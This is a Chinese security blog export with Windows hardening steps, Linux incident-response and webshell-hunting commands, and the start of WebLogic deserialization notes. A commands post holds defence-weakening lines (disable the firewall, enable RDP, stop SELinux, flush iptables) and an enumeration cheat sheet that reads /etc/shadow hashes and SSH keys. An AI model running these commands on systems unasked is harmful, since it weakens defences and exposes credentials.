class="string">&quot;审核特权使用&quot;</span> 	  设置为<span class="string">&quot;成功&quot;</span>和<span class="string">&quot;失败&quot;</span>都要审核</span><br><span class="line">    <span class="string">&quot;审核系统事件&quot;</span> 	  设置为<span class="string">&quot;成功&quot;</span>和<span class="string">&quot;失败&quot;</span>都要审核</span><br><span class="line">    <span class="string">&quot;审核账户管理&quot;</span> 	  设置为<span class="string">&quot;成功&quot;</span>和<span class="string">&quot;失败&quot;</span>都要审核</span><br><span class="line">    <span class="string">&quot;审核过程追踪&quot;</span> 	  设置为<span class="string">&quot;成功&quot;</span>和<span class="string">&quot;失败&quot;</span>都要审核</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 在具体的文件-&gt;属性-&gt;设置访问</span></span><br></pre></td></tr></table></figure>

<h6 id="日志记录策略设置"><a href="#日志记录策略设置" class="headerlink" title="日志记录策略设置"></a>日志记录策略设置</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#目的 </span></span><br><span class="line">进入事件查看器</span><br><span class="line">打开运行-&gt;eventvwr.msc</span><br><span class="line">在日志属性中设置日志大小不小于1024KB,设置当达到最大日志尺寸时，按需要改写事件</span><br></pre></td></tr></table></figure>

<h5 id="IP协议安全"><a href="#IP协议安全" class="headerlink" title="IP协议安全"></a>IP协议安全</h5><h6 id="启用TCP-x2F-IP筛选"><a href="#启用TCP-x2F-IP筛选" class="headerlink" title="启用TCP&#x2F;IP筛选"></a>启用TCP&#x2F;IP筛选</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 过滤掉不必要的端口，提高网络安全性</span><br><span class="line">运维人员列出业务所需端口</span><br><span class="line">打开本地连接</span><br><span class="line">	控制面板-&gt;网络连接-&gt;本地连接</span><br><span class="line">找到高级TCP/IP设置</span><br><span class="line">	右击本地连接-&gt;internet协议属性-&gt;高级TCP/IP设置</span><br><span class="line">	在选项的属性中启用网络连接的tcp/IP筛选，是开放业务协议端口</span><br></pre></td></tr></table></figure>

<h6 id="开启系统防火墙"><a href="#开启系统防火墙" class="headerlink" title="开启系统防火墙"></a>开启系统防火墙</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的:多角度封堵业务以外的端口连接</span></span><br><span class="line">运维人员列出业务所需端口</span><br><span class="line">打开本地连接中的防火墙</span><br><span class="line">	控制面板-&gt;网络连接-&gt;本地连接</span><br><span class="line">	在高级选项中设置启用windows防火墙</span><br><span class="line">设置例外</span><br><span class="line">	只允许业务端口接入网络</span><br></pre></td></tr></table></figure>

<h6 id="设置空闲超时锁定系统"><a href="#设置空闲超时锁定系统" class="headerlink" title="设置空闲超时锁定系统"></a>设置空闲超时锁定系统</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 防止由疏忽导致的系统被非法使用</span></span><br><span class="line">进入控制面板-&gt;显示-&gt;屏幕保护程序</span><br><span class="line">启用屏幕保护程序，设置等待时间为5分钟，启用在恢复时使用密码保护功能</span><br></pre></td></tr></table></figure>

<h6 id="设置网络服务挂起时间"><a href="#设置网络服务挂起时间" class="headerlink" title="设置网络服务挂起时间"></a>设置网络服务挂起时间</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的:防止远程登录时由于疏忽导致的系统被非法使用</span></span><br><span class="line">打开本地安全策略</span><br><span class="line">	打开运行，输入secpol.msc</span><br><span class="line">打开安全选项</span><br><span class="line">	本地策略—&gt;安全选项</span><br><span class="line">	<span class="string">&quot;microsoft网络服务器&quot;</span>设置<span class="string">&quot;在挂起会话之前所需空闲时间&quot;</span>为5分钟</span><br></pre></td></tr></table></figure>

<h6 id="关闭默认共享"><a href="#关闭默认共享" class="headerlink" title="关闭默认共享"></a>关闭默认共享</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: windows默认共享分区，关闭后提高信息安全性</span></span><br><span class="line"><span class="comment"># win+r  mmc  可以查看</span></span><br><span class="line">打开注册表编辑器，编辑和新建键值</span><br><span class="line">	打开运行-&gt;regedit.msc</span><br><span class="line">展开lsa目录</span><br><span class="line">	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</span><br><span class="line">	调整Restrictanonymous键值为1</span><br><span class="line">	建两个DWORD值分别命名为AutoShareWks和AutoShareServer</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h6 id="设置共享文件夹权限"><a href="#设置共享文件夹权限" class="headerlink" title="设置共享文件夹权限"></a>设置共享文件夹权限</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 只允许授权账户访问共享文件夹</span></span><br><span class="line">进入系统工具</span><br><span class="line">	控制面板-&gt;管理工具-&gt;计算机管理</span><br><span class="line">		进入系统工具-&gt;共享文件夹</span><br><span class="line">		查看每个文件夹的共享权限并按需求更改</span><br><span class="line">		在共享权限中删除everyone动态组</span><br></pre></td></tr></table></figure>

<h5 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h5><h6 id="安全系统补丁"><a href="#安全系统补丁" class="headerlink" title="安全系统补丁"></a>安全系统补丁</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的:修复系统漏洞，安装最新的service pack补丁集</span></span><br><span class="line">部署wsus服务器</span><br><span class="line">从microsoft update下载补丁</span><br><span class="line">在测试机上安装补丁后测试业务运行情况</span><br><span class="line">使用wsus服务器内网分发补丁</span><br></pre></td></tr></table></figure>

<h6 id="安装和更新杀毒软件"><a href="#安装和更新杀毒软件" class="headerlink" title="安装和更新杀毒软件"></a>安装和更新杀毒软件</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的: 提高系统防御力，保护关键信息不被破坏</span></span><br><span class="line">在服务器上安装最新版企业防病毒软件的服务端</span><br><span class="line">使用C/S架构部署企业版防病毒软件</span><br><span class="line">制定统一安全查杀规则</span><br></pre></td></tr></table></figure>

<h5 id="windows的服务"><a href="#windows的服务" class="headerlink" title="windows的服务"></a>windows的服务</h5><h6 id="关闭无用服务-1"><a href="#关闭无用服务-1" class="headerlink" title="关闭无用服务"></a>关闭无用服务</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的:关闭不必要的服务，提高系统性能和安全性</span></span><br><span class="line">打开服务管理器</span><br><span class="line">	打开运行-&gt;services.msc</span><br><span class="line">关闭禁用服务</span><br><span class="line">	右击无关服务-&gt;属性-&gt;启动类型(禁用)-&gt;运行状态-&gt;停止</span><br><span class="line">	系统必须服务见附表</span><br></pre></td></tr></table></figure>

<h6 id="关闭无用自启动项"><a href="#关闭无用自启动项" class="headerlink" title="关闭无用自启动项"></a>关闭无用自启动项</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 目的: 减少开机自启动服务和软件，提高性能和安全性</span><br><span class="line">打开微软控制台</span><br><span class="line">	打开运行-&gt;msconnfig</span><br><span class="line">	在启动选项卡中去掉多余的启动项的&quot;√&quot;</span><br></pre></td></tr></table></figure>

<h6 id="关闭windows自动播放功能"><a href="#关闭windows自动播放功能" class="headerlink" title="关闭windows自动播放功能"></a>关闭windows自动播放功能</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目的:防止从移动存储设备感染自运行病毒</span></span><br><span class="line">打开组策略编辑器</span><br><span class="line">	打开运行-&gt;gpedit.msc</span><br><span class="line">找到策略所在</span><br><span class="line">	计算机配置-&gt;管理模板-&gt;系统-&gt;设置</span><br><span class="line">	关闭自动播放-&gt;已启用</span><br></pre></td></tr></table></figure>





<h4 id="应急"><a href="#应急" class="headerlink" title="应急"></a>应急</h4><p><strong>特征</strong>:文件名   找到直接删，  </p>
<p><strong>时间</strong>：从文件时间入手，去匹配业务日志里面的时间段</p>
<p><strong>流量</strong>：态势感知</p>
<p> 如果是免杀，按照创建时间找，如果改时间，对比哈希值</p>
<p>或者快照，直接回档</p>
<h5 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># linux </span></span><br><span class="line"><span class="comment"># messages文件记录了操作系统的所有日志消息,内核，进程，服务</span></span><br><span class="line">/var/log/messages</span><br><span class="line"><span class="comment"># syslog日志文件是另一个记录系统日志的文件，组件和服务的消息，smtp、pop、imap</span></span><br><span class="line">/var/log/syslog</span><br><span class="line"><span class="comment"># auth.log日志记录用户认证、授权访问控制的信息</span></span><br><span class="line">/var/log/auth.log</span><br><span class="line"><span class="comment"># kern.log日志记录所有与系统内核相关的事件和消息，内核故障，驱动程序错误，内核崩溃</span></span><br><span class="line">/var/log/kern.log</span><br><span class="line"><span class="comment"># daemon.log日志记录所有与系统demon相关的事件和消息</span></span><br><span class="line">/var/log/daemon.log</span><br><span class="line"><span class="comment"># boot.log日志记录Linux启动过程中的所有日志消息</span></span><br><span class="line">/var/log/boot.log</span><br><span class="line"><span class="comment"># cron日志记录与定时或循环任务相关的所有消息</span></span><br><span class="line">/var/log/cron</span><br><span class="line"><span class="comment"># dmesg记录了通过系统启动信息输出到终端上，包括设备驱动加载、内存信息、设备探测等</span></span><br><span class="line">/var/log/dmesg</span><br><span class="line"><span class="comment"># maillog用于记录与邮件系统及其相关组件相关的所有消息 pop/imap</span></span><br><span class="line">/var/log/maillog</span><br></pre></td></tr></table></figure>

<p>查找 nginx 访问日志</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>从日志中查找404错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo awk <span class="string">&#x27;$9 == 404 || $7 == 404 &#123;print&#125;&#x27;</span> /var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>查找大量出现404错误的IP地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo awk <span class="string">&#x27;$9 == 404 || $7 == 404 &#123;print $1&#125;&#x27;</span> /var/log/nginx/access.log | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -rn</span><br></pre></td></tr></table></figure>

<p>防火墙阻止192.168.1.100访问</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo iptables -I INPUT -s 192.168.1.100 -j DROP</span><br></pre></td></tr></table></figure>

<p>查看ssh登录错误日志</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/auth.log</span><br></pre></td></tr></table></figure>

<p>查找错误登录IP地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/auth.log | grep <span class="string">&#x27;Failed password&#x27;</span> | awk <span class="string">&#x27; &#123;print $(NF-3)&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -rn</span><br></pre></td></tr></table></figure>

<p>使用 ufw 屏蔽攻击者的 IP   192.168.1.100</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw insert 1 deny from 192.168.1.100 to any</span><br></pre></td></tr></table></figure>



<p>查看ssh登录成功日志</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/auth.log | grep sshd</span><br></pre></td></tr></table></figure>

<p>出现在日志中的用户都是经过ssh登录的,还可以用grep过滤出失败的登录日志</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/auth.log | grep sshd | grep <span class="string">&#x27;Failed password&#x27;</span></span><br></pre></td></tr></table></figure>

<p>查看系统日志，筛选ssh登录记录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/syslog | grep sshd</span><br></pre></td></tr></table></figure>

<p>获取登录者的IP地址，以下命令会显示所有失败的登录尝试并指出攻击者的IP地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cat</span> /var/log/auth.log | grep <span class="string">&#x27;sshd.*Failed password&#x27;</span> | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -n</span><br></pre></td></tr></table></figure>

<p>使用netstat 验证获取到的ip是否是攻击者ip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo netstat -anp | grep &lt;IP address&gt;</span><br></pre></td></tr></table></figure>

<h5 id="后门排查"><a href="#后门排查" class="headerlink" title="后门排查"></a>后门排查</h5><p>内存马排查</p>
<p>查找所有java进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux | grep java</span><br></pre></td></tr></table></figure>

<p>查看每个java进程的所有者</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -ef | grep java</span><br></pre></td></tr></table></figure>

<p>查看java进程参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jps -mlv</span><br></pre></td></tr></table></figure>

<p>查看java进程使用的所有类和包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jmap -histo &lt;PID&gt;</span><br></pre></td></tr></table></figure>

<h5 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h5><p>检查网站目录文件，找所有的.php和.sh文件，并且查找eval函数的使用情况</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /var/www/public -<span class="built_in">type</span> f \( -iname <span class="string">&quot;*.php&quot;</span> -or -iname <span class="string">&quot;*.sh&quot;</span> \) -<span class="built_in">exec</span> grep -iRl <span class="string">&quot;eval&quot;</span> &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p>查找后门</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install chkrootkit rkhunter</span><br><span class="line">sudo chkrootkit</span><br><span class="line">sudo rkhunter --check</span><br></pre></td></tr></table></figure>

<p>查找异常文件，最近被修改过的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo find / -<span class="built_in">type</span> f -mtime -7 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>查找web服务根目录下比较大的文件和目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">du</span> -ah /var/www/ | grep G</span><br></pre></td></tr></table></figure>

<p>找出对用户可写的文件和目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo find / -xdev -<span class="built_in">type</span> d \( -perm -0002 -a ! -perm -1000 \) -<span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p>找出可执行文件设置了setuid和setgid权限的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo find / -perm /6000 -type f -exec ls -la &#123;&#125; 2&gt;/dev/null \;</span><br></pre></td></tr></table></figure>

<p>监控网络连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netstat -tnpa | grep ESTABLISHED</span><br></pre></td></tr></table></figure>

<p>看日志文件，wenshell可能被隐藏到日志中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /var/log/auth.log | grep -i sshd</span><br></pre></td></tr></table></figure>

<h5 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h5><p>检查当前环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $PATH</span><br></pre></td></tr></table></figure>

<p>检查系统环境变量，在&#x2F;etc&#x2F;environment中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /etc/environment</span><br></pre></td></tr></table></figure>

<p>检查shell配置文件，确保每个文件没有添加可疑目录或者路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/.bash_profile、/etc/bash.bashrc、/etc/environment</span><br></pre></td></tr></table></figure>

<p>检查LD_PRELOAD变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $LD_PRELOAD</span><br></pre></td></tr></table></figure>

<h5 id="排查系统异常账户"><a href="#排查系统异常账户" class="headerlink" title="排查系统异常账户"></a>排查系统异常账户</h5><p>查看所有系统账户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>

<p>查看root账户信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /etc/passwd | grep &#x27;root&#x27;</span><br></pre></td></tr></table></figure>

<p>检查sudo访问权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /etc/sudoers</span><br></pre></td></tr></table></figure>

<p>查看系统特权账户，linux有一些默认特权用户，wheel、adm、root等，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /etc/group | grep -E &quot;root|adm|lp|wheel&quot;</span><br></pre></td></tr></table></figure>

<p>检查ssh登录日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /var/log/auth.log | grep &#x27; sshd&#x27;</span><br></pre></td></tr></table></figure>

<p>检查登录历史</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure>

<h5 id="检查计划任务"><a href="#检查计划任务" class="headerlink" title="检查计划任务"></a>检查计划任务</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ls -alR /etc/cron.*</span><br><span class="line">sudo ls -alR /var/spool/cron/crontabs</span><br></pre></td></tr></table></figure>















]]></content>
      <tags>
        <tag>配置</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>命令</title>
    <url>/2023/06/11/%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h5 id="推送到github"><a href="#推送到github" class="headerlink" title="推送到github"></a>推送到github</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g    # generate生成</span><br><span class="line">hexo d    # deploy 推送</span><br></pre></td></tr></table></figure>



<h5 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">关闭防火墙和开启3389</span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode mode=<span class="built_in">disable</span></span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>



<p>docker</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#进入容器内部</span><br><span class="line">docker exec -it &lt;id&gt;   /bin/bash</span><br><span class="line"></span><br><span class="line">#检测是否在docker中</span><br><span class="line"># 是否存在此文件</span><br><span class="line">ls -al /.dockerenv</span><br><span class="line"></span><br><span class="line"># 在其中是否包含docker字符串</span><br><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure>



<p>linux</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#切换账户到admin</span></span><br><span class="line">su -l admin </span><br><span class="line"></span><br><span class="line"><span class="comment">#创建账户</span></span><br><span class="line">useradd   name  </span><br><span class="line">passwd   name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置静态网卡</span></span><br><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eno</span><br><span class="line">systemctl restart network</span><br><span class="line"><span class="comment">#关闭防火墙和临时禁用selinux安全模块</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">setenforce 0</span><br><span class="line"><span class="comment">#清空防火墙规则</span></span><br><span class="line">iptables -F</span><br><span class="line">获取内核，操作系统和设备信息</span><br><span class="line">版本信息</span><br><span class="line"><span class="built_in">uname</span> -a 所有版本</span><br><span class="line"><span class="built_in">uname</span> -r 内核版本信息</span><br><span class="line"><span class="built_in">uname</span> -n 系统主机名字</span><br><span class="line"><span class="built_in">uname</span> -m Linux内核架构</span><br><span class="line">内核信息 <span class="built_in">cat</span> /proc/version</span><br><span class="line">CPU信息 <span class="built_in">cat</span> /proc/cpuinfo</span><br><span class="line">发布信息</span><br><span class="line"><span class="built_in">cat</span> /etc/*-release</span><br><span class="line"><span class="built_in">cat</span> /etc/issue</span><br><span class="line">主机名 hostname</span><br><span class="line">文件系统 <span class="built_in">df</span> -a</span><br><span class="line">内核日志 dmesg / /var/log/dmesg</span><br><span class="line">6.2.1.2. 用户和组</span><br><span class="line">列出系统所有用户 <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">列出系统所有组 <span class="built_in">cat</span> /etc/group</span><br><span class="line">列出所有用户<span class="built_in">hash</span>（root）``<span class="built_in">cat</span> /etc/shadow``</span><br><span class="line">用户</span><br><span class="line">查询用户的基本信息 finger</span><br><span class="line">当前登录的用户 <span class="built_in">users</span> <span class="built_in">who</span> -a /var/log/utmp</span><br><span class="line">查询无密码用户 grep <span class="string">&#x27;x:0:&#x27;</span> /etc/passwd</span><br><span class="line">目前登录的用户 w</span><br><span class="line">登入过的用户信息 last / /var/log/wtmp</span><br><span class="line">显示系统中所有用户最近一次登录信息 lastlog / /var/log/lastlog</span><br><span class="line">登录成功日志 /var/log/secure</span><br><span class="line">登录失败日志 /var/log/faillog</span><br><span class="line">查看特权用户 grep :0 /etc/passwd</span><br><span class="line">查看passwd最后修改时间 <span class="built_in">ls</span> -l /etc/passwd</span><br><span class="line">查看是否存在空口令用户 awk -F: <span class="string">&#x27;length($2)==0 &#123;print $1&#125;&#x27;</span> /etc/shadow</span><br><span class="line">查看远程登录的账号 awk <span class="string">&#x27;/\$1|\$6/&#123;print $1&#125;&#x27;</span> /etc/shadow</span><br><span class="line">查看具有sudo权限的用户</span><br><span class="line"><span class="built_in">cat</span> /etc/sudoers | grep -v <span class="string">&quot;^#\|^$&quot;</span> | grep <span class="string">&quot;ALL=(ALL)&quot;</span></span><br><span class="line">6.2.1.3. 用户和权限信息</span><br><span class="line">当前用户 <span class="built_in">whoami</span></span><br><span class="line">当前用户信息 <span class="built_in">id</span></span><br><span class="line">可以使用sudo提升到root的用户（root） <span class="built_in">cat</span> /etc/sudoers</span><br><span class="line">列出目前用户可执行与无法执行的指令 sudo -l</span><br><span class="line">6.2.1.4. 环境信息</span><br><span class="line">打印系统环境信息 <span class="built_in">env</span></span><br><span class="line">打印系统环境信息 <span class="built_in">set</span></span><br><span class="line">环境变量中的路径信息 <span class="built_in">echo</span>  <span class="variable">$PATH</span></span><br><span class="line">打印历史命令 <span class="built_in">history</span> / ~/.bash_history</span><br><span class="line">显示当前路径 <span class="built_in">pwd</span></span><br><span class="line">显示默认系统遍历 <span class="built_in">cat</span> /etc/profile</span><br><span class="line">显示可用的shell <span class="built_in">cat</span> /etc/shells</span><br><span class="line">6.2.1.5. 进程信息</span><br><span class="line">查看进程信息 ps aux</span><br><span class="line">资源占有情况 top -c</span><br><span class="line">查看进程关联文件 lsof -c <span class="variable">$PID</span></span><br><span class="line">完整命令行信息 /proc/<span class="variable">$PID</span>/cmdline</span><br><span class="line">进程的命令名 /proc/<span class="variable">$PID</span>/comm</span><br><span class="line">进程当前工作目录的符号链接 /proc/<span class="variable">$PID</span>/cwd</span><br><span class="line">运行程序的符号链接 /proc/<span class="variable">$PID</span>/exe</span><br><span class="line">进程的环境变量 /proc/<span class="variable">$PID</span>/environ</span><br><span class="line">进程打开文件的情况 /proc/<span class="variable">$PID</span>/fd</span><br><span class="line">6.2.1.6. 服务信息</span><br><span class="line">由inetd管理的服务列表 <span class="built_in">cat</span> /etc/inetd.conf</span><br><span class="line">由xinetd管理的服务列表 <span class="built_in">cat</span> /etc/xinetd.conf</span><br><span class="line">nfs服务器的配置 <span class="built_in">cat</span> /etc/exports</span><br><span class="line">邮件信息 /var/log/mailog</span><br><span class="line">ssh配置 sshd_config</span><br><span class="line">6.2.1.7. 计划任务</span><br><span class="line">显示指定用户的计划作业（root） crontab -l -u %user%</span><br><span class="line">计划任务</span><br><span class="line">/var/spool/cron/*</span><br><span class="line">/var/spool/anacron/*</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/etc/cron.*</span><br><span class="line">/etc/anacrontab</span><br><span class="line">开机启动项</span><br><span class="line">/etc/rc.d/init.d/</span><br><span class="line">6.2.1.8. 网络、路由和通信</span><br><span class="line">列出网络接口信息 /sbin/ifconfig -a / ip addr show</span><br><span class="line">列出网络接口信息 <span class="built_in">cat</span> /etc/network/interfaces</span><br><span class="line">查看系统arp表 arp -a</span><br><span class="line">打印路由信息 route / ip ro show</span><br><span class="line">查看dns配置信息 <span class="built_in">cat</span> /etc/resolv.conf</span><br><span class="line">打印本地端口开放信息 netstat -an</span><br><span class="line">列出iptable的配置规则 iptables -L</span><br><span class="line">查看端口服务映射 <span class="built_in">cat</span> /etc/services</span><br><span class="line">Hostname hostname -f</span><br><span class="line">查看进程端口情况 netstat -anltp | grep <span class="variable">$PID</span></span><br><span class="line">6.2.1.9. 已安装程序</span><br><span class="line">rpm -qa --last Redhat</span><br><span class="line">yum list | grep installed CentOS</span><br><span class="line"><span class="built_in">ls</span> -l /etc/yum.repos.d/</span><br><span class="line">dpkg -l Debian</span><br><span class="line"><span class="built_in">cat</span> /etc/apt/sources.list Debian APT</span><br><span class="line">pkg_info xBSD</span><br><span class="line">pkginfo Solaris</span><br><span class="line">pacman -Q Arch Linux</span><br><span class="line">emerge Gentoo</span><br><span class="line">6.2.1.10. 文件</span><br><span class="line">最近五天的文件 find / -ctime +1 -ctime -5</span><br><span class="line">文件系统细节 debugfs</span><br><span class="line">6.2.1.11. 公私钥信息</span><br><span class="line">~/.ssh</span><br><span class="line">/etc/ssh</span><br><span class="line">6.2.1.12. 日志</span><br><span class="line">/var/log/boot.log</span><br><span class="line">/var/log/cron</span><br><span class="line">/var/log/faillog</span><br><span class="line">/var/log/lastlog</span><br><span class="line">/var/log/messages</span><br><span class="line">/var/log/secure</span><br><span class="line">/var/log/syslog</span><br><span class="line">/var/log/syslog</span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/log/wtmp</span><br><span class="line">/var/run/utmp</span><br><span class="line">6.2.1.13. 虚拟环境检测</span><br><span class="line">lsmod | grep -i <span class="string">&quot;vboxsf\|vboxguest&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;vmw_baloon\|vmxnet&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;xen-vbd\|xen-vnif&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;virtio_pci\|virtio_net&quot;</span></span><br><span class="line">lsmod | grep -i <span class="string">&quot;hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc&quot;</span></span><br><span class="line">6.2.1.14. 容器内信息收集</span><br><span class="line">capsh --<span class="built_in">print</span></span><br><span class="line"><span class="built_in">cat</span> /proc/1/cgroup</span><br><span class="line"><span class="built_in">env</span> | grep KUBE</span><br><span class="line"><span class="built_in">ls</span> -l .dockerenv</span><br><span class="line"><span class="built_in">ls</span> -l /run/secrets/Kubernetes.io/</span><br><span class="line">mount</span><br><span class="line">ps aux</span><br></pre></td></tr></table></figure>




]]></content>
      <tags>
        <tag>配置</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>weblogic漏洞笔记</title>
    <url>/2023/06/23/weblogic/</url>
    <content><![CDATA[<h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1><p>历史漏洞</p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="CVE-2015-4852-amp-CVE-2016-0638（没试）"><a href="#CVE-2015-4852-amp-CVE-2016-0638（没试）" class="headerlink" title="CVE-2015-4852&amp;CVE-2016-0638（没试）"></a>CVE-2015-4852&amp;CVE-2016-0638（没试）</h4><blockquote>
<p>基于weblogic t3 协议引起远程代码执行的反序列化</p>
</blockquote>
<p>RMI通信传输反序列化数据，接收数据后进行反序列化，正常RMI通信使用的是JRMP协议，而在Weblogic的RMI通信中使用的是T3协议。T3协议是Weblogic独有的一个协议，相比于JRMP协议多了一些特性。</p>
<p>t3协议特点</p>
<p>1.心跳包机制，60秒一次，240秒未收到心跳判定与客户端连接丢失</p>
<p>2.建立一次连接可以将全部数据包传输完成，优化了数据包的大小和网络消耗</p>
<p>请求包头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">t3 12.2.1 AS:255 HL:19 MS:10000000 PU:t3://us-l-breens:7001</span><br></pre></td></tr></table></figure>

<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230627021143866.png" alt="image-20230627021143866"></p>
<p>返回的内容中HELO后面有版本号</p>
<p>分析序列化数据看不懂，跳过</p>
<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><ol>
<li>将weblogic发送的JAVA序列化数据的第二到九部分的JAVA序列化数据的任意一个替换为恶意的序列化数据。</li>
<li>将weblogic发送的JAVA序列化数据的第一部分与恶意的序列化数据进行拼接。</li>
</ol>
<p>这里可以用jdk7u21和cc1两条链，用创建文件的方式来检验反序列化是否成功</p>
